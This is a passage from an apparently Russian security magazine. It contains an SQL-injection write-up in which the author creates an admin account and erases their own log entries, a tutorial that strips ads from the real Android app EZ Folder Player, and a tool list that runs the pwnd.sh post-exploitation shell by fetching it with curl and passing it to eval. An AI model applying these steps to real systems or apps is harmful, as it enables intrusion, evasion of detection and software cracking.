            $sql = "SELECT id, text FROM dict.relation WHERE LOWER
               (text) LIKE '" . strtolower_cyr($_GET['q']) . "%'";
            $res = pg_query($sql);
            if (!$res) die('Invalid query: ' . pg_result_error());
            $output = "";
            while ($f = pg_fetch_array($res)) {
                $output .= "|" . $f['id'] . "|" . $f['text'] . "\n";
            }
            //header('Content-Type: text/html; charset=utf-8');
            echo $output;
        }
    }
    ?>

Как видно из кода, для обращения к данному скрипту необходимо выста-
вить заголовок запроса X-Requested-With со значением XMLHttpRequest.
На вход данный скрипт принимает GET-параметр с именем q и производит
SELECT-запрос к базе данных, при этом входной параметр не фильтруется.
Данный недостаток позволяет произвести атаку SQLi.


ОПРЕДЕЛЕНИЕ СПЕЦИФИКАЦИИ ЗАПРОСА НА ДОБАВЛЕНИЕ
ПОЛЬЗОВАТЕЛЯ
Дальнейший анализ исходных кодов выявил, что в скрипте add.php содержит-
ся спецификация запроса на создание нового пользователя (рис. 28). Имя
и тип столбцов в таблице users возможно узнать также и с помощью SQLi,
но частые обращения к одному и тому же скрипту и SQLi в GET-параметре мо-
гут привести к компрометации исследователя, поэтому при наличии исходного
кода лучше пользоваться им.




                           Рис. 28. Спецификация запроса на добавление пользователя

После определения необходимых полей INSERT-запроса для создания поль-
зователя необходимо определить их валидные значения. Для этого сделаем
выборку данных значений по существующему пользователю с помощью инъ-
екции, основанной на UNION-запросе. В качестве имени пользователя выбе-
рем значение admin (рис. 29).





                        Рис. 29. Выборка всех полей таблицы users пользователя admin


ОПРЕДЕЛЕНИЕ АЛГОРИТМА ХЕШИРОВАНИЯ ПАРОЛЯ
Как видишь, в INSERT-запросе нет поля password, но при выборке данное
поле доступно, и там расположен хеш пароля. Для определения алгоритма хе-
ширования также воспользуемся имеющимся исходным кодом. Для этого за-
глянем в скрипт add.php, в котором и определен алгоритм хеширования паро-
ля (рис. 30).





                                               Рис. 30. Алгоритм хеширования пароля

При этом мы знаем, что к бэкенду пароль в открытом виде не приходит. Он хе-
шируется на стороне клиента с помощью JavaScript и отправляется в формате
md5(md5(password)) (рис. 31).





                                      Рис. 31. Хеширование пароля на стороне клиента

В итоге получаем следующий алгоритм хеширования пароля:

sha512(id_user + md5(md5(password)))

Таким образом, у нас есть вся необходимая информация для создания нового
пользователя в веб-приложении без прохождения аутентификации.

СОЗДАНИЕ ПОЛЬЗОВАТЕЛЯ
А теперь попробуем создать пользователя с логином sqli, именем The_SQL_
injection_Bypass и административным доступом к системе (рис. 32).





                                            Рис. 32. Запрос на создание пользователя

Затем проверим, что пользователь создан, и узнаем его ID (рис. 33).





                                            Рис. 33. Получение ID нового пользователя


ГЕНЕРАЦИЯ ХЕША ПАРОЛЯ ДЛЯ НОВОГО ПОЛЬЗОВАТЕЛЯ
Пользователь  создан,  его  ID  8de553f1-db73-4f03-84ca-a5bc2ca8fdab,
для генерации валидного хеша пароля был написан небольшой скрипт
create_pass.php (прошу извинить за #говнокод):

    <?php
        echo "<!DOCTYPE html>\n";
        echo "<html><head></head><body>\n";
        $id_user = $_GET['id_user'];
        echo "<pre>user_id: ".$id_user."</pre>\n";
        $password = $_GET['password'];
        echo "<pre>password: ".$password."</pre>\n";
        $hash_password = hash('md5', hash('md5', $password));
        echo "<pre>md5(md5(password)): ".$hash_password."</pre>\n";
        $hash = hash( 'sha512',$id_user.$hash_password);
        echo "<pre>sha512(md5(md5(user_id + password))): ".$hash.
            "</pre>\n";
        echo "</body></html>\n"
    ?>

Создаем  нашему   пользователю   c   ID   8de553f1-db73-4f03-84ca-
a5bc2ca8fdab хеш для пароля sqli (рис. 34).





                                               Рис. 34. Получение хеша для пароля sqli

И обновляем хеш пароля для нашего пользователя (рис. 35).





                                  Рис. 35. Обновление пароля для нового пользователя

ПРОВЕРКА
Чтобы проверить, что все получилось, входим в систему с логином sqli и па-
ролем sqli (рис. 36).





                                                   Рис. 36. Аутентификация в сервисе

Как видно из рис. 37, аутентификация успешно пройдена.





                                                   Рис. 37. Аутентификация пройдена

После входа система отобразила заданное при создании имя: «Пользователь:
The_SQL_injection_Bypass».

УДАЛЕНИЕ ДЕЙСТВИЙ ИЗ ЛОГА
После того как мы вошли в систему и вышли из нее с учетной записью sqli,
наши действия попали в лог. Манипулировать записями в логе также возмож-
но с помощью найденной SQLi. Для начала выведем активность пользовате-
ля sqli, выборка осуществляется также на основе айдишника: 8de553f1-db73-
4f03-84ca-a5bc2ca8fdab (рис. 38).





                                    Рис. 38. Вывод журнала действий пользователя sqli

В логах видно, что пользователь sqli вошел в систему и вышел из нее. Такие
данные нам в базе ни к чему :) (рис. 39).





                               Рис. 39. Удаление из журнала действия пользователя sqli

Ну и наконец, проверим, что записи удалены (рис. 40).





                                      Рис. 40. Журнал действий пользователя sqli пуст

ВЫВОД
Как видишь, благодаря небрежному хранению бэка-
па приложения у нас появился еще один вектор с до-
вольно большой базовой оценкой CVSS: внутренний
злоумышленник, имеющий сетевую связность с сер-
вером, на котором крутится данное веб-приложение,          INFO
и не обладающий аутентификационными данными,
                                                                    Если хочешь поподробней
может провести атаку SQLi на базу данных прило-                                                                      разобраться с описанными
жения. В том числе добавить, изменить или удалить        атаками, рекомендую
пользователей приложения, кроме того, удалить лог     прочитать следующие вещи:
своих действий из базы данных, что позволит ему из-                                                                    XSS
бежать обнаружения и значительно затруднит рас-
следование инцидента.                                                  SQLi

                                                                         XST
Вектор CVSS v2: (AV:N/AC:H/Au:N/C:C/I:C/A:C),
базовая оценка: 7.6.                                           CSRF

Мысли вслух

Ты спросишь: если у тебя есть не ограниченная санитизацией, типизацией
и валидацией SQLi к базе данных сервера, то почему бы тебе просто не выло-
жить shell или сдампить файлы? Ответ прост: пользователь СУБД, из-под кото-
рого была проведена данная SQLi, не обладает правами на доступ к файловой
системе.
ВЗЛОМ
ЛОМАЕМ СОФТ
ДЛЯ ANDROID





   Евгений Зобнин
    zobnin@gmail.com

ЧАСТЬ 3.
ОБФУСКАТОРЫ, УПАКОВЩИКИ И ДРУГИЕ
СРЕДСТВА ЗАЩИТЫ КОДА




В прошлых статьях мы узнали, насколько действитель-
но легко взломать и модифицировать приложение
для Android. Однако не всегда все бывает так просто.
Иногда разработчики применяют обфускаторы и систе-
мы шифрования, которые могут существенно осложнить
работу реверсера, поэтому сегодня мы поговорим о том,
как разобраться в намеренно запутанном коде, а заодно
взломаем еще одно приложение.

На самом деле ты уже должен быть знаком как минимум с одним методом
обфускации (запутывания) кода. В прошлой статье мы внедряли зловредную
функциональность в WhatsApp, и если ты внимательно читал статью и сам про-
бовал декомпилировать WhatsApp, то наверняка заметил, что большинство
классов приложения, почти все его методы и переменные имеют странные
имена: aa, ab либо что-то вроде 2F323988C, если смотреть код с помощью
декомпилятора jadx.
   Это и есть обфускация, и я могу с полной уверенностью утверждать,
что проделана она с помощью инструмента ProGuard из комплекта Android
Studio. Именно он выдает на выходе такие странные имена классов, методов
и переменных, а кроме того, удаляет неиспользуемый код и оптимизирует не-
которые участки приложения с помощью инлайнинга методов.
   Пропущенный через ProGuard код более компактен, занимает меньше па-
мяти и намного более сложен для понимания. Но только в том случае, если
это большое приложение. Разобраться, что делает простой обфусцированный
код, очень легко:





Но представь, если из подобных буквенных, цифровых или буквенно-цифро-
вых обозначений (ProGuard позволяет использовать любой словарь для гене-
рации идентификаторов) будет состоять громоздкое приложение в десятки
тысяч строк кода:





И так на тысячи строк вперед, а дальше твой декомпилятор может поперхнуть-
ся кодом и выдать вместо Java нечто вроде этого:





Недурно, не правда ли? А теперь представь, что эти строки состоят не из обыч-
ных символов алфавита, а из символов Unicode (так делает DexGuard, ком-
мерческая версия ProGuard) или наборов вроде  l1ll1, повторяющихся раз
этак пятьдесят. Разработчик вполне может применить и более мощные сред-
ства обфускации, нашпиговав приложение бессмысленным кодом. Такой код
не будет выполнять никаких полезных функций, но направит тебя совершенно
не в ту сторону, что грозит как минимум потерей времени.
   Не желая его терять, ты можешь начать с поиска строк, которые приведут
тебя к цели: это могут быть различные идентификаторы, с помощью которых
приложение регистрирует себя на сервере, строки, записываемые в конфиг
при оплате, пароли и так далее. Однако вместо строк ты вполне можешь уви-
деть нечто вроде этого:




Это зашифрованная строка, которая расшифровывается во время исполне-
ния приложения. Такую защиту предлагают DexGuard, Allatory и многие другие
обфускаторы. Она действительно способна остановить очень многих, но соль
в том, что если есть зашифрованный текст, значит, в коде должен быть и де-
шифратор. Его очень легко найти с помощью поиска по имени переменной (в
данном случае zb). При каждом ее использовании всегда будет вызываться
метод, дешифрующий строку. Выглядеть это может примерно так:


Здесь метод a() класса a и есть дешифратор. Поэтому, чтобы узнать, что вну-
три зашифрованной строки, нужно просто добавить в дизассемблированный
код приложения вызов функции Log.d("DEBUG", a.a(zb)) и собрать его об-
ратно (как это сделать, описано в первой статье цикла). После запуска при-
ложение само выдаст в лог дешифрованную строку. Лог можно просмотреть
либо подключив смартфон к компу и вызвав команду adb logcat, либо с по-
мощью приложения CatLog для Android (требует root).
   Нередко, правда, придется попотеть, чтобы найти дешифратор. Он может
быть встроен во вполне безобидную функцию и дешифровать строку неявно,
может состоять из нескольких функций, которые вызываются на разных этапах
работы со строкой. Сама зашифрованная строка может быть разбита на не-
сколько блоков, которые собираются вместе во время исполнения приложе-
ния. Но самый шик — это класс-дешифратор внутри массива!
   DexGuard имеет функцию скрытия классов, которая работает следующим
образом. Байт-код скрываемого класса извлекается из приложения, сжимает-
ся с помощью алгоритма Gzip и записывается обратно в приложение в форме
массива байтов (byte[]). Далее в приложение внедряется загрузчик, который
извлекает код класса из массива и с помощью рефлексии создает на его ос-
нове объект, а затем вызывает нужные методы. И конечно же, DexGuard ис-
пользует этот трюк для скрытия дешифратора, а также кода других классов
по желанию разработчика. Более того, скрытые в массивах классы могут быть
зашифрованы с помощью скрытого в другом массиве дешифратора!
   Так что, если ты имеешь дело с приложением, имена классов в котором на-
писаны на китайском или языке смайликов, а по коду разбросаны странные
массивы длиной от нескольких сот элементов до десятков тысяч, знай — здесь
поработал DexGuard.
  С рефлексией вместо прямого вызова методов объекта ты можешь стол-
кнуться и в других обстоятельствах, не связанных со скрытием классов. Реф-
лексия может быть использована просто для обфускации (как в случае с обфу-
скатором Allatory). Тогда вместо такого кода:




ты увидишь нечто вроде этого:





А если используется шифрование — это:





В данном случае я закодировал строки в Base64, поэтому их легко «раскоди-
ровать» с помощью команды

$ echo строка | base64 -d

Но в реальном приложении тебе, скорее всего, придется расшифровать все
эти строки с помощью описанного выше способа просто для того, чтобы по-
нять, какие объекты и методы вызывает приложение в своей работе.
   А еще есть упаковщики. Это другой вид защиты, основанный не на запуты-
вании кода, а на его полном скрытии от глаз реверсера. Работает он так. Ори-
гинальный файл classes.dex (содержащий код приложения) переименовывает-
ся, шифруется и перемещается в другой каталог внутри пакета APK (это может
быть каталог assets, res или любой другой). Место оригинального classes.dex
занимает распаковщик, задача которого — загрузить в память оригинальный
classes.dex, расшифровать его и передать ему управление. Для усложнения
жизни реверсера основная логика распаковщика реализу-
ется на языке си, который компилируется в нативный код
ARM с применением средств обфускации и защиты от от-
ладки (gdb, ptrace).
   Хороший упаковщик создает очень большие проблемы
для анализа кода приложения. В ряде случаев единствен-
ный действенный вариант борьбы с ними — это снятие    WWW
дампа памяти процесса и извлечение из него уже расшиф-
                                                                                           Protect Your Java
рованного кода classes.dex. Но есть и хорошие новости:                                                                       Code — Through
упаковщик накладывает серьезные ограничения на функ-      Obfuscators And
циональность  приложения,  приводит  к  несовместимо-         Beyond
стям и увеличенному расходу памяти. Так что разработчики                                                                                       Obfuscation in
обычных приложений используют упаковщики редко, зато      Android malware,
их очень любят создатели разного рода троянов и вирусов.       and how to fight
                                                                                    back   Вычислить наличие упаковщика в APK совсем нетрудно.
Для этого достаточно взглянуть на содержимое каталога lib/                                                                                         Reversing
armeabi. Если ты найдешь в нем файл libapkprotect2.so, зна-       DexGuard 5.x
чит, применен упаковщик ApkProtect, файл libsecexe.so —
Bangle, libexecmain.so — ljiami.

ДЕОБФУСКАТОРЫ
Как видишь, инструментов обмануть тебя и отбить желание расковыривать
приложение у разработчиков предостаточно, поэтому и ты должен быть во-
оружен. В первую очередь нужен хороший декомпилятор. На всем протяже-
нии цикла мы использовали бесплатный jadx, вполне неплохо справляющийся
с этой задачей. Кроме этого, он имеет встроенный деобфускатор, трансфор-
мирующий идентификаторы вида a, az, l1l1l1l1... или состоящие из символов
Unicode в цифро-буквенные идентификаторы, уникальные для всего приложе-
ния. Это позволяет никогда не спутать метод a() класса a с методом a() класса
b и легко находить нужные идентификаторы с помощью глобального поиска.
   Также тебе понадобится инструмент для дампа информации о пакете.
Не такой информации, как его содержимое и дата сборки, а информации
об используемых в пакете средствах обфускации и защиты. В первую очередь
стоит обратить внимание на ApkDetecter. Также можно попробовать APKiD.
  Оба инструмента должны показывать, был ли применен тот или иной обфу-
скатор или упаковщик в отношении приложения, но часто не показывают ни-
чего. Это вполне закономерно, обфускаторы эволюционируют, меняя логику
своей работы, приемы обфускации и скрытия от подобных инструментов.
   По этой же причине нередко оказываются бессильны и деобфускаторы, та-
кие как Java Deobfuscator и Simplify. Но это совсем не значит, что их не стоит
применять. Java Deobfuscator работает исключительно с байт-кодом Java, по-
этому перед тем, как его использовать, APK нужно перегнать в JAR с помощью
dex2jar.
   Далее следует натравить на полученный JAR-файл Java Deobfuscator с ука-
занием используемого «трансформера»:

$ java -jar deobfuscator.jar -input Приложение.jar
    -output Приложение_после_деобфускации.jar
    -transformer allatori.StringEncryptionTransformer
    -path ~/Android/android-sdk-linux/platforms/android-23/android.jar

Данная   команда   применит   к   приложению   трансформер    allatori.
StringEncryptionTransformer, расшифровывающий зашифрованные с помощью
Allatory строки, и запишет результат в Приложение_после_деобфускации.jar.
После этого приложение можно декомпилировать, но не с помощью jadx (он
работает только с байт-кодом Android Dalvik), а, например, с помощью JD-GUI.
   Java Deobfuscator поддерживает более десятка трансформеров, позволя-
ющих расшифровывать строки, зашифрованные другими обфускаторами, кон-
вертировать вызовы с помощью рефлексии в обычные, удалять мертвый код
и так далее. Поэтому можно поэкспериментировать.
   Если же Java Deobfuscator не дал результатов, стоит попробовать Simplify.
Это так называемый динамический деобфускатор. Он не анализирует байт-
код, пытаясь найти в нем следы работы обфускаторов и отменить внесенные
ими изменения, как это делает Java Deobfuscator. Вместо этого он запускает
дизассемблированный код smali внутри виртуальной машины, позволяя при-
ложению самостоятельно расшифровать строки, затем удаляет мертвый неис-
пользуемый код и рефлексию. На выходе ты получишь dex-файл, который мож-
но декомпилировать с помощью jadx.
   Использовать Simplify довольно просто:

$ java -jar simplify.jar -i каталог_с_файлами_smali -o classes.dex





                                                  Код до применения Simplify





                                               Код после применения Simplify

Но как быть с упаковщиками? Для этого есть инструмент Kisskiss. Для его ра-
боты нужен смартфон с правами root и активированным режимом отладки
(ADB) в режиме root (в CyanogenMod можно включить в «Режиме для разра-
ботчиков»). Также на компе понадобится команда adb:

$ sudo apt-get install android-tools-adb
$ sudo adb devices

Далее Kisskiss необходимо установить на смартфон:

$ wget https://github.com/strazzere/android-unpacker/archive/
    master.zip
$ unzip master.zip
$ cd android-unpacker-master/native-unpacker
$ sudo apt-get install build-essential
$ make
$ make install

Запустить нужное приложение на смартфоне и выполнить команду (на компе)

$ adb shell /data/local/tmp/kisskiss имя.пакета.приложения

После этого Kisskiss сделает дамп памяти процесса и запишет его в odex-
файл. Его можно сконвертировать в dex с помощью уже знакомого нам
baksmali:

$ adb pull /system/framework/arm/boot.oat /tmp/framework/boot.oat
$ baksmali -c boot.oat -d /tmp/framework -x файл.odex

И декомпилировать с помощью jadx.

НЕБОЛЬШОЙ ПРИМЕР
Ну и в заключение приведу небольшой пример взлома обфусцированного
приложения. Он не очень сложный, без шифрования и упаковки, но позволяет
понять логику работы с кодом, по которому трудно ориентироваться из-за из-
мененных идентификаторов. В этот раз мы будем работать с EZ Folder Player,
а именно уберем из него рекламу.
   Для начала установим приложение на смартфон и внимательно проследим
за тем, в каких случаях и на каких экранах появляется реклама. Нетрудно заме-
тить, что она есть только на экране выбора файла. Это важная информация, ко-
торая нам очень пригодится. Теперь попробуем включить режим полета, завер-
шить приложение и вновь запустить его. Реклама полностью исчезает. Это тоже
важно, приложение явно умеет самостоятельно включать и выключать показ ре-
кламы, а значит, все, что нам требуется, — это просто найти данный код и либо
удалить «включатель» рекламы, либо самостоятельно вызвать «выключатель».
   Теперь скачиваем приложение на комп с помощью APKPure, кладем его
в каталог ~/tmp и переименовываем в ez.apk для удобства работы. Открываем
пакет в jadx-gui и видим множество каталогов (Java-пакетов). Нужный нам па-
кет носит имя самого приложения: com.dp.ezfolderplayer.free. Открываем его,
внутри множество классов с именами вида C0770p, C0763i и так далее, почти
все переменные и методы любого класса носят имена типа f2881, f2284:





Не внушает оптимизма, правда? Совсем непонятно, с чего начать. Точнее,
было бы непонятно, если бы мы не знали, что реклама отображается исключи-
тельно на экране выбора файла. Проматываем вниз и видим нужный нам класс
FilesActivity.
   Но почему он не обфусцирован? По простой причине: каждый экран при-
ложения в Android — это так называемая активность (activity), а все активности
должны быть явно перечислены в манифесте приложения — Manifest.xml. Если
бы обфускатор изменил имя класса-активности, Android просто не смог бы его
найти и приложение вывалилось бы с ошибкой.
   Открываем FilesActivity и сразу смотрим, работает ли он с провайдером ре-
кламы напрямую (или же делает это через другой класс либо с помощью реф-
лексии). Для этого взглянем на директивы import:





Да, класс явно вызывает методы пакета com.google.android.gms.ads (стан-
дартный гугловский провайдер рекламы), иначе зачем бы ему его импортиро-
вать. Осталось найти место, где он это делает, и просто изменить или удалить
код так, чтобы рекламы не было видно. Ближе к концу кода находим это:





Несмотря на применение обфускации, код вполне понятный, мы видим нор-
мальные имена классов (AdView, AdSize, LinearLyout) и методов (setAdUnitId,
findViewById). Легко можем понять, что делает этот код: создает новый гра-
фический элемент (View) с рекламой, настраивает его вид, а затем загружа-
ет в него рекламное объявление. Вопрос только в том, почему мы это видим?
Обфускатор настолько плох и не справляется со своей работой?
   На самом деле все намного проще: обфускатор работает исключитель-
но с кодом самого приложения и поэтому неспособен запутать код внешних
для него классов (а это классы пакета com.google.android.gms.ads и все си-
стемные классы). Поэтому зачастую логику работы обфусцированного кода до-
вольно легко проследить по вызовам внешних API. В случае с EZ Folder Player
мы не знаем имя загружающего рекламу метода (m4989q) и имя объекта, хра-
нящего View (f2394K), но видим все его методы и обращения к системным API
(тот же findViewById), что позволяет сделать вывод о том, зачем весь этот код.
   А теперь о том, как все это отключить. Самый простой вариант — просто
удалить весь код метода, но это может привести к ошибкам в других участках
кода, которые, возможно, обращаются к объекту f2493K. Вместо этого мы пой-
дем немного другим путем. Обрати внимание на пятую строку кода. Она вызы-
вает метод setVisibility объекта f2493K, который, в свою очередь, хранит
View рекламного блока. Метод setVisibility позволяет настраивать отображение
View, указав одно из возможных состояний с помощью числа. Если мы взгля-
нем на справку Android, то узнаем, что 8 означает: View должен быть полно-
стью убран с экрана.
   Другими словами, данный код формирует View с рекламным блоком,
а затем сам же его убирает с экрана. Но зачем? Затем, что нет смысла по-
казывать рекламный блок, если он еще не загружен (помнишь исчезновение
рекламы в режиме полета?). Но как приложение узнает, что реклама загрузи-
лась? Согласно документации — с помощью AdListener: разработчик созда-
ет класс-наследник AdListener, создает рекламный View, вызывает его метод
setAdListener, в качестве аргумента передавая ему объект класса-наслед-
ника AdListener, и вызывает loadAd для загрузки рекламы. Когда реклама за-
грузится, будет вызван метод onAdLoaded() класса-наследника AdListener.
   А теперь смотри на строку:


C0766l не может быть ничем иным, кроме класса-наследника AdListener. От-
крываем его в jadx и видим:




Бинго! Всего одна строка кода, которая делает рекламный View видимым (зна-
чение 0). Если мы ее удалим, View останется невидим на все время работы
приложения.
   Но вот незадача: в дизассемблированном с помощью apktool коде smali нет
класса C0766l. Такой идентификатор мы видим только в jadx, потому что он пе-
реименовал класс. Но зато он оставил для нас комментарий касательно на-
стоящего имени класса:





Открываем ez/smali/com/dp/ezfolderplayer/free/l.smali и видим следующий код:





Это и есть строка this.f2868a.f2493K.setVisibility(0);. Чтобы убрать
ее, необходимо удалить почти весь метод, оставив только четыре строки:





Остается только собрать APK и установить на девайс:

$ cd ~/tmp
$ apktool b ez
$ mv ez/dist/ez.apk ez-noads.apk
$ sign ez-noads.s.apk





                     EZ Folder Player до                              ...и после модификации

ВЫВОДЫ
Несмотря на существование большого количества обфускаторов и других
средств защиты приложений, подавляющее большинство разработчиков ис-
пользуют исключительно встроенный в Android Studio ProGuard. Разобрать-
ся в коде приложения, обфусцированного с его помощью, совсем несложно,
но и разбираться в работе более продвинутых обфускаторов тоже необходи-
мо. Хотя бы для того, чтобы уметь реверсить вирусы. Ты же не собираешься
заниматься варезом, правда?
ВЗЛОМ





                                 Дмитрий «D1g1» Евдокимов,
                                                                Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!





                  WINAFL
                     Уже достаточно давно сердца всех любителей
                       фаззинга покорил AFL от Михала Залевски (Michal
                            Zalewski) для фаззинга с расширением покрытия
                          кода, что позволяет ему проверить больше путей
                       программы. Только вот одна незадача: он отлично
                        работает лишь при наличии исходного кода про-
                         екта на *nix-системах, что, как ты сам понимаешь,
                       не всегда выполнимо, особенно для приложений
                      под ОС Windows.Автор:
                         WinAFL —  это  форк  оригинального  AFLIvan Fratric
                       для ОС Windows, позволяющий фаззить сразу ис-
                      полняемые файлы. Данный инструмент используетURL:
                       не compilation time инструментацию, как оригинал,github.com/ivanfratric/winafl
                       а динамическую бинарную инструментацию, реа-
                       лизованную в движке DynamoRIO. Стоит отметить,Система:
                         что такое изменение в подходах вносит оверхедWindows
                        в два раза по сравнению с оригинальной скоростью
                      работы программы.
                        Для сборки проекта понадобится Visual Studio
                   Command Prompt, и отдельно собирается версия
                          как для 32-битной, так и 64-битной системы. А при-
                    мер запуска программы под этим фаззером выгля-
                        дит вот таким образом:

                         path\to\DynamoRIO\bin64\drrun.exe -c winafl.dll
                             -debug -target_module test_gdiplus.exe
                             -target_offset 0x1270 -fuzz_iterations 10
                             -nargs 2 -- test_gdiplus.exe input.bmp




                PWND.SH
                        Pwnd.sh — это post-exploitation-фреймворк (и ин-
                        терактивный шелл), разработанный на скриптовом
                       языке оболочки Bash. Он нацелен на кросс-плат-
                      форменность с минимальными сторонними зависи-
                       мостями.
                            Установка:

                        $ cd bin/
                        $ ./compile_pwnd_sh.sh
Автор:
Itzik Kotler                      Это сгенерирует файл под названием pwnd.sh, и уже
                     можно приступать к делу. При этом скрипт отлично
URL:                        работает в памяти, то есть даже в файловых систе-
github.com/SafeBreach-                      мах read-only, и отлично исчезает после переза-
Labs/pwndsh                           грузки. Один из способов такого запуска выглядит
                     следующим образом:
Система:
Linux, macOS, Solaris
                         # Создаем переменную X
                         # Устанавливаем X в значение pwnd.sh
                         # (получаем через curl)
                         $ X=`curl -fsSL «https://raw.githubuser
                             content.com/SafeBreach-Labs/pwndsh/
                             master/bin/pwnd.sh»`
                         # Используем Bash eval
                         $ eval «$X»

                      Более подробно об инструменте можно узнать
                        из презентации Just Got PWND.sh (pdf) с конферен-
                      ции SkyDogCon 2016.




                 DAVSCAN
                     DAVScan — это быстрый и легковесный WebDAV-ска-
                         нер, разработанный для обнаружения скрытых фай-
                       лов и директорий на серверах с включенным про-
                       токолом WebDAV. Сканер вычисляет неправильно
                       сконфигурированные серверы, серверы с избыточ-
                    ными привилегиями, серверы с уязвимостями рас-
                        крытия информации или обхода аутентификации.
                      Сканер пытается сначала определить версию сер-
                         вера, а затем опробовать все результаты, выданные
Автор:                       через запрос PROPFIND.
Graph-X                          Особенности:
                         •  определение заголовка сервера: если сервер
URL:                         возвращает валидный хедер, DAVScan ищет до-
github.com/Graph-X/davscan                          ступные публичные эксплоиты под него;
                         •  первичное    WebDAV-сканирование    через
Система:                        PROPFIND: быстрое сканирование с целью выя-
Windows/Linux                            вить что-либо видимое через WebDAV;
                         •  обход  unicode-аутентификации:  эксперимен-
                           тальная опция, требует перепроверки правиль-
                          ности срабатывания;
                         •  исключение DoS-эксплоитов из списка: при ра-
                          боте ты можешь исключить данный тип эксплои-
                            тов (опция -d);
                         •  исключение модулей MSF из списка (опция -m).

                       Использовать можно так:

                        $ davscan.py [-h] -H HOST [-p PORT]
                            [-a AUTH] [-u USER] [-P PASSWORD]
                            [-o OUTFILE] [-d ] [-m ]
                      То есть необходимая опция для запуска — это толь-
                        ко -H и наименование хоста. Если не задана опция
                       выходного файла, то результаты будут записывать-
                        ся в /tmp/davout.





                 URLFUZZ
                   Еще один фаззер, написанный на Node.js, но отли-
                     чающийся от многих использованием мощи асин-
                       хронных/неблокирующих  функций  ввода-вывода
                           Node.js. Это позволяет делать ОЧЕНЬ БЫСТРЫЕ
                        веб-запросы.
                        Способен фаззить:
                         •  URL;
                         •  данные POST;
                         •  заголовки HTTP;
Автор:                         •  фильтры.
Daniel Garcia
                    Может фильтровать ответы по кодам ошибок, номе-
URL:                        ру слова, номеру строки, тексту. Полезные нагруз-
github.com/danigargu/urlfuzz                             ки: список слов, брутфорс, диапазон.
                            Установка:
Система:
Windows/Linux
                        $ npm install

                    Пример запуска фаззинга POST-данных, используй
                       словарик и фильтруй по тексту:

                         $ node urlfuzz.js http://localhost/login.php
                             -d «user=admin&pass=#FUZZ#» -w big.txt
                             --ht denied




                  ONIOFF
                     ONIOFF — инспектор Onion URL’ов. Это простая
                            тулза, написанная на чистом Python, для изучения
                       URL’ов глубокого веба (Deep Web). Она принима-
                         ет на вход ссылки и возвращает их текущий статус
                       вместе с названием самих страничек.
                        Совместима с Python 2.6 и 2.7.
                            Установка:

                        $ git clone https://github.com/k4m4/Автор:                            onioff.gitNikolaos Kamarinakis
                        $ cd onioff
                        $ pip install -r requirements.txtURL:
github.com/k4m4/onioff
                      Поддерживается считывание ссылок из файла и за-
                       пись отчета в файл. Пример запуска:
Система:
Windows/Linux
                        $ python onioff.py -f ~/onions.txt
                            -o ~/report.txt

                      Здесь onions.txt — файл с ссылками, а report.txt —
                        файл, куда будут записываться результаты.




                ОБНАРУЖЕНИЕ SANDBOX-ОКРУЖЕНИЙ
                      Sandbox detection tool — это инструмент для обнару-
                      жения виртуальных окружений. Он содержит самые
                      свежие техники детекта, вместе с этим ты можешь
                      модифицировать их самостоятельно без редакти-
                       рования исходного кода.
                        Поддерживаемые окружения:
                         •  Cuckoo Sandbox;
                         •  продукты VMware;
                         •  VirtualBox.
Автор:
Alexander Chailytko,                       Особенности:
Stanislav Skuratovich                         •  легко расширяем: быстро добавляется поддерж-
                            ка новых виртуальных сред;
URL:                         •  в инструменте содержатся все техники по обна-
github.com/CheckPointSW/                        ружению Cuckoo Sandbox — самого распростра-
VB2016-sandbox-evasion                          ненного виртуального окружения для автомати-
                           ческого анализа малвари;
Система:                         •  возможность добавлять новые техники обна-
Windows                         ружения не путем изменения исходного кода,
                          а с помощью конфигурационных файлов JSON,
                            то есть можно добавлять способы обнаружения
                        даже самостоятельно;
                         •  понятные отчеты: их могут читать как хардкорные
                           специалисты, так и высший менеджмент.

                      Более подробно об инструменте можно узнать
                        из презентации Defeating Sandbox Evasion  (pdf)
                       с конференции Virus Bulletin 2016.




                WINDOWS SCREEN RECORDER
                      Windows screen recorder — это простой инструмент
                       для записи происходящего на экране ОС Windows.
                      Написан на Python 2.7 и PyQt5. При этом устано-
                      вочный файл не зависит от установленной версии
                         Python и PyQt.
                         Инсталлер добавит инструмент в меню «Пуск»,
                      но его же можно напрямую вызывать и из програм-
                   мы на Python. Для этого надо зарегистрировать би-
                        блиотеки Qt-screen-capture-recorder.dll и Qt-
Автор:                      screen-capture-recorder-x64.dll  с помощьюStorm Shadow
                        скрипта register_run_as_admin.bat.
                           Управлять рекордером можно через значок в си-
URL:                      стемном трее, просто кликнув по нему левой или
github.com/techbliss/                       правой кнопкой мыши.
Windows_Screenrecorder

Система:
Windows
MALWARE





                                                                              Иван Пискунов
                                                                                                   www.ipiskunov.blogspot.com,
                                                                                             g14vano@gmail.com

REVERSING
MALWARE
ДЛЯ НАЧИНАЮЩИХ
   ЧАСТЬ 0: ВВЕДЕНИЕ В РЕМЕСЛО



INTRO
Предлагаем твоему вниманию цикл статей «Reversing
malware  для  начинающих», посвященных методикам
и техникам анализа бинарного кода вредоносов в «до-
машней лаборатории». В первой статье мы коснемся
специфики нашего ремесла, рассмотрим основной ин-
струментарий, необходимый нам для исследований,      WARNING
и сделаем обзор наиболее интересных и значимых ре-                                                                      Вся информация предо-
сурсов для самостоятельного изучения.                                                                            ставлена исключитель-
                                                                        но в ознакомительных
REVERSING КАК ИСКУССТВО                                    целях. Ни редакция,                                                                       ни автор не несут ответ-
Сегодня анализ вредоносного кода — это целая инду-                                                                             ственности за любой
стрия в области обеспечения информационной безо-     возможный вред, при-
пасности. Им занимаются и антивирусные лаборатории,     чиненный материалами
                                                                           данной статьи.выпускающие свои продукты для защиты, и узкоспеци-
ализированные группы экспертов, стремящихся быть
в тренде векторов атак, и даже сами вирусописатели, которые конкурируют
между собой за потенциального клиента — «жертву». Для вирусного анали-
тика, сидящего в застенках какого-нибудь крупного разработчика, это каждо-
дневная кропотливая работа, требующая порой нестандартного и проактивно-
го подхода. Однако, несмотря на то что функциональность малвари постоянно
совершенствуется и техники обфускации модифицируются, общие методы
анализа остаются уже долгое время неизменными.
  Одна из важных частей анализа малвари — реверсинг (англ. reverse code
engineering), или «обратная разработка», программного обеспечения. Если
в двух словах, реверсинг — это попытка изучить и воссоздать алгоритмы ра-
боты программы, не имея на руках исходных кодов, с помощью специальных
